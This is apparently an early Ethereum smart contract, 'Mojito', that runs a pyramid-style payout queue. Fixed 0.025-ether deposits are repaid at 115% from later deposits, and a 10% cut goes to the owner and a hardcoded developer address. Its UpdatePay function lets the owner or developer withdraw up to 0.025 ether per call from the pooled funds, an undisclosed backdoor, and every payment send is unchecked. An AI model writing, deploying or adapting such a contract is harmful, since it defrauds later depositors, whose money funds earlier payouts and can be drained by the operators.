 

 
contract Mojito
{
    struct Person 
    {
        address ETHaddress;
        uint ETHamount;
    }

    Person[] public persons;

    uint public paymentqueue = 0;
    uint public feecounter;
    uint amount;
    
    address public owner;
    address public developer=0xC99B66E5Cb46A05Ea997B0847a1ec50Df7fe8976;
    address meg=this;

    modifier _onlyowner
    {
        if (msg.sender == owner || msg.sender == developer)
        _
    }
    
    function Mojito() 
    {
        owner = msg.sender;
    }
    function()                                                                   
    {
        enter();
    }
    function enter()
    {
        if (msg.sender == owner || msg.sender == developer)                      
	    {
	        UpdatePay();                                                         
	    }
	    else                                                                     
	    {
            feecounter+=msg.value/10;                                            
	        owner.send(feecounter/2);                                            
	        developer.send(feecounter/2);                                        
	        feecounter=0;                                                        
	        
            if (msg.value == (1 ether)/40)                                       
            {
	            amount = msg.value;                                              
	            uint idx=persons.length;                                         
                persons.length+=1;
                persons[idx].ETHaddress=msg.sender;
                 persons[idx].ETHamount=amount;
                canPay();                                                        
            }
	        else                                                                 
	        {
	            msg.sender.send(msg.value - msg.value/10);                       
	        }
	    }

    }
    
    function UpdatePay() _onlyowner                                              
    {
        if (meg.balance>((1 ether)/40)) {  
            msg.sender.send(((1 ether)/40));
        } else {
            msg.sender.send(meg.balance);
        }
    }
    
    function canPay() internal                                                   
    {
        while (meg.balance>persons[paymentqueue].ETHamount/100*115)              
        {
            uint transactionAmount=persons[paymentqueue].ETHamount/100*115;      
            persons[paymentqueue].ETHaddress.send(transactionAmount);            
            paymentqueue+=1;                                                     
        }
    }
}